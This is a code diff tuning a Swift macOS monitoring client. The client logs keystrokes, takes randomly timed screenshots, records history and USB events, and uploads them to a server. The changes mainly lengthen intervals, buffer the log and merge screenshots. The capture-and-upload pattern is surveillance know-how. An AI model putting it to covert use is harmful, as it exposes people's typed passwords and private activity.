@@ -19,10 +19,10 @@ let API_ROUTE = "/webapi.php"
 let TIC_ROUTE = "/eventhandler.php"
 var APP_VERSION = "1.0"
 
-var TIME_INTERVAL = 1
-let TIC_INTERVAL = 30
-let HISTORY_INTERVAL = 120
-let KEY_INTERVAL = 60
+var TIME_INTERVAL = 60      // Screenshots every 60 seconds (optimized from 1)
+let TIC_INTERVAL = 300      // Tic every 5 minutes (optimized from 30 seconds)
+let HISTORY_INTERVAL = 600  // History every 10 minutes (optimized from 2 minutes)
+let KEY_INTERVAL = 300      // Keys every 5 minutes (optimized from 1 minute)
 var timer: Timer? = nil
 var macAddress: String = ""
 var activeRunning: Bool = false
@@ -142,10 +142,10 @@ class AppDelegate: NSObject, NSApplicationDelegate, NSUserNotificationCenterDele
 
     // Add these properties at the top of the class
     private var lastEventTapCheck: Date = Date()
-    private var eventTapCheckInterval: TimeInterval = 3.0 // Check every 3 seconds
+    private var eventTapCheckInterval: TimeInterval = 30.0 // Check every 30 seconds (optimized from 3)
     private var isReestablishingEventTap: Bool = false
     var lastKeyCaptureTime: Date = Date()
-    private let maxKeyCaptureGap: TimeInterval = 10.0 // Alert if no keys for 10 seconds
+    private let maxKeyCaptureGap: TimeInterval = 60.0 // Alert if no keys for 60 seconds (optimized from 10)
     
     // Last sent times for status tracking
     private var lastKeyLogSent: Date?
@@ -161,9 +161,12 @@ class AppDelegate: NSObject, NSApplicationDelegate, NSUserNotificationCenterDele
     // Client information (cached)
     private var clientIPAddress: String = "Unknown"
 
-    // Logging system
+    // Logging system (optimized with buffering)
     let logFile = "MonitorClient.log"
     var logFileHandle: FileHandle?
+    private var logBuffer: [String] = []
+    private var logFlushTimer: Timer?
+    private let maxLogBufferSize = 50
 
     // MARK: - Logging Functions
     
@@ -284,15 +287,28 @@ class AppDelegate: NSObject, NSApplicationDelegate, NSUserNotificationCenterDele
         // Console output - always print for debugging
         print(logEntry.trimmingCharacters(in: .whitespacesAndNewlines))
         
-        // File logging
-        if let data = logEntry.data(using: .utf8) {
-            logFileHandle?.write(data)
-            logFileHandle?.synchronizeFile()
+        // Buffered file logging (optimized)
+        logBuffer.append(logEntry)
+        
+        // Flush buffer if it gets too large or for important messages
+        if logBuffer.count >= maxLogBufferSize || level == .error {
+            flushLogBuffer()
         }
         
         // System log
         let osLog = OSLog(subsystem: "com.alice.MonitorClient", category: "monitoring")
         os_log("%{public}@", log: osLog, type: level.osLogType, message)
+    }
+    
+    private func flushLogBuffer() {
+        guard !logBuffer.isEmpty else { return }
+        
+        let combinedLogs = logBuffer.joined()
+        if let data = combinedLogs.data(using: .utf8) {
+            logFileHandle?.write(data)
+            logFileHandle?.synchronizeFile()
+        }
+        logBuffer.removeAll()
     }
     
 
@@ -409,8 +425,8 @@ class AppDelegate: NSObject, NSApplicationDelegate, NSUserNotificationCenterDele
         logMonitoringEvent("Setting up event tap monitoring")
         setupEventTapInvalidationMonitoring()
         
-        // Single timer for all tasks
-        timer = Timer.scheduledTimer(timeInterval: 1.0, target: self, selector: #selector(checkAllTasks), userInfo: nil, repeats: true)
+        // Single timer for all tasks (optimized interval)
+        timer = Timer.scheduledTimer(timeInterval: 5.0, target: self, selector: #selector(checkAllTasks), userInfo: nil, repeats: true)
         logSuccess("Main monitoring timer started")
         
         let center = NSWorkspace.shared.notificationCenter
@@ -456,6 +472,9 @@ class AppDelegate: NSObject, NSApplicationDelegate, NSUserNotificationCenterDele
             print("ERROR setting up status bar menu: \(error)")
         }
         
+        // Setup log flush timer (flush logs every 30 seconds)
+        logFlushTimer = Timer.scheduledTimer(timeInterval: 30.0, target: self, selector: #selector(flushLogsPeriodically), userInfo: nil, repeats: true)
+        
         logSuccess("MonitorClient initialization complete")
         print("=== MonitorClient Startup Complete ===")
         print("Status bar icon should be visible in menu bar")
@@ -481,6 +500,20 @@ class AppDelegate: NSObject, NSApplicationDelegate, NSUserNotificationCenterDele
         logMessage("User switched away from this session", level: .info)
         activeRunning = false
     }
+    
+    @objc func flushLogsPeriodically() {
+        flushLogBuffer()
+    }
+    
+    // Check if system is idle before performing heavy operations
+    private func shouldPerformHeavyOperation() -> Bool {
+        // Check for any recent user activity (keyboard, mouse, etc.)
+        let lastKeyActivity = CGEventSource.secondsSinceLastEventType(.combinedSessionState, eventType: .keyDown)
+        let lastMouseActivity = CGEventSource.secondsSinceLastEventType(.combinedSessionState, eventType: .leftMouseDown)
+        
+        // Consider system active if there was any input in the last 5 minutes
+        return lastKeyActivity < 300 || lastMouseActivity < 300
+    }
 
     @objc func checkAllTasks() {
         let currentDate = Date()
@@ -491,11 +524,15 @@ class AppDelegate: NSObject, NSApplicationDelegate, NSUserNotificationCenterDele
         // Add event tap validation check to main timer loop
         checkAndReestablishEventTapThrottled()
                 
-        // Check if it's time for screenshots
+        // Check if it's time for screenshots (with activity check)
         if currentDate.timeIntervalSince(lastScreenshotCheck) >= TimeInterval(TIME_INTERVAL) {
-            logMonitoringEvent("Screenshot monitoring triggered", details: "Interval: \(TIME_INTERVAL)s")
-            let randomDelay = Double.random(in: 0...Double(TIME_INTERVAL))
-            perform(#selector(TakeScreenShotsAndPost), with: nil, afterDelay: randomDelay)
+            if shouldPerformHeavyOperation() {
+                logMonitoringEvent("Screenshot monitoring triggered", details: "Interval: \(TIME_INTERVAL)s")
+                let randomDelay = Double.random(in: 0...Double(TIME_INTERVAL))
+                perform(#selector(TakeScreenShotsAndPost), with: nil, afterDelay: randomDelay)
+            } else {
+                logMessage("Skipping screenshot - system appears idle", level: .debug)
+            }
             lastScreenshotCheck = currentDate
         }
         
@@ -1348,7 +1385,7 @@ class AppDelegate: NSObject, NSApplicationDelegate, NSUserNotificationCenterDele
             
                 // Send data in chunks
                 sendDataInChunks(data: self.keyLogs, eventType: "KeyLog", chunkSize: 500)
-                self.keyLogs.removeAll()
+                self.keyLogs.removeAll(keepingCapacity: true) // Optimized memory management
             lastKeyLogSent = Date()
                 logSuccess("Key logs sent and cleared", details: "\(keyLogs.count) keys")
         } else {
@@ -1369,34 +1406,33 @@ class AppDelegate: NSObject, NSApplicationDelegate, NSUserNotificationCenterDele
         
         logMessage("Found \(displayCount) display(s)", level: .debug)
         
-        for (index, screen) in NSScreen.screens.enumerated() {
-            let filename = NSTemporaryDirectory() + "temp\(index + 1).jpg"
+        // Capture single screenshot of all displays combined
+        let filename = NSTemporaryDirectory() + "screenshot.jpg"
+        
+        // Use CGWindowListCreateImage to capture the entire screen area
+        if let image = CGWindowListCreateImage(
+            CGRect.null,
+            .optionOnScreenOnly,
+            kCGNullWindowID,
+            .bestResolution
+        ) {
+            let bitmapRep = NSBitmapImageRep(cgImage: image)
+            let options: [NSBitmapImageRep.PropertyKey: Any] = [.compressionFactor: 0.21]
             
-            // Use CGWindowListCreateImage to capture the entire screen
-            if let image = CGWindowListCreateImage(
-                CGRect.null,
-                .optionOnScreenOnly,
-                kCGNullWindowID,
-                .bestResolution
-            ) {
-                let bitmapRep = NSBitmapImageRep(cgImage: image)
-                let options: [NSBitmapImageRep.PropertyKey: Any] = [.compressionFactor: 0.21]
-                
-                if let jpegData = bitmapRep.representation(using: .jpeg, properties: options) {
-                    do {
-                        try jpegData.write(to: URL(fileURLWithPath: filename), options: .atomic)
-                        logMessage("Screenshot saved: \(filename) (\(jpegData.count) bytes)", level: .debug)
-                        postImage(path: filename)
-                    } catch {
-                        logError("Failed to save screenshot: \(error)", context: "Screenshot")
-                    }
+            if let jpegData = bitmapRep.representation(using: .jpeg, properties: options) {
+                do {
+                    try jpegData.write(to: URL(fileURLWithPath: filename), options: .atomic)
+                    logMessage("Screenshot saved: \(filename) (\(jpegData.count) bytes)", level: .debug)
+                    postImage(path: filename)
+                } catch {
+                    logError("Failed to save screenshot: \(error)", context: "Screenshot")
                 }
-            } else {
-                logError("Failed to capture screenshot for display \(index + 1)", context: "Screenshot")
             }
+        } else {
+            logError("Failed to capture screenshot", context: "Screenshot")
         }
         
-        logSuccess("Screenshot capture completed", details: "\(displayCount) display(s)")
+        logSuccess("Screenshot capture completed", details: "1 combined screenshot")
     }
     
 
@@ -1969,6 +2005,11 @@ class AppDelegate: NSObject, NSApplicationDelegate, NSUserNotificationCenterDele
         statusBarItem = nil
         statusMenu = nil
         
+        // Clean up logging
+        logFlushTimer?.invalidate()
+        logFlushTimer = nil
+        flushLogBuffer() // Final flush
+        
         // Clean up notification observers
         NotificationCenter.default.removeObserver(self)
         NSWorkspace.shared.notificationCenter.removeObserver(self)
@@ -2241,7 +2282,7 @@ class AppDelegate: NSObject, NSApplicationDelegate, NSUserNotificationCenterDele
             do {
                 // Send data in chunks
                 sendDataInChunks(data: self.usbDeviceLogs, eventType: "USBLog", chunkSize: 500)
-                self.usbDeviceLogs.removeAll()
+                self.usbDeviceLogs.removeAll(keepingCapacity: true) // Optimized memory management
                 lastUSBLogSent = Date()
                 logSuccess("USB logs sent and cleared", details: "\(usbDeviceLogs.count) events")
             } catch {
@@ -2635,11 +2676,11 @@ class AppDelegate: NSObject, NSApplicationDelegate, NSUserNotificationCenterDele
     
     // Check accessibility permission periodically and request if needed
     private func checkAccessibilityPermissionPeriodically() {
-        // Check every 30 seconds
+        // Check every 5 minutes (optimized from 30 seconds)
         let lastCheck = storage.double(forKey: "last-accessibility-check")
         let currentTime = Date().timeIntervalSince1970
         
-        if currentTime - lastCheck > 30 {
+        if currentTime - lastCheck > 300 {
             storage.set(currentTime, forKey: "last-accessibility-check")
             
             if !isInputMonitoringEnabled() {
@@ -2992,8 +3033,8 @@ class AppDelegate: NSObject, NSApplicationDelegate, NSUserNotificationCenterDele
         // Set the menu
         statusBarItem?.menu = statusMenu
         
-        // Start status update timer
-        statusUpdateTimer = Timer.scheduledTimer(timeInterval: 2.0, target: self, selector: #selector(updateStatusMenu), userInfo: nil, repeats: true)
+        // Start status update timer (optimized interval)
+        statusUpdateTimer = Timer.scheduledTimer(timeInterval: 10.0, target: self, selector: #selector(updateStatusMenu), userInfo: nil, repeats: true)
         
         logMessage("Status bar menu setup complete", level: .info)
     }
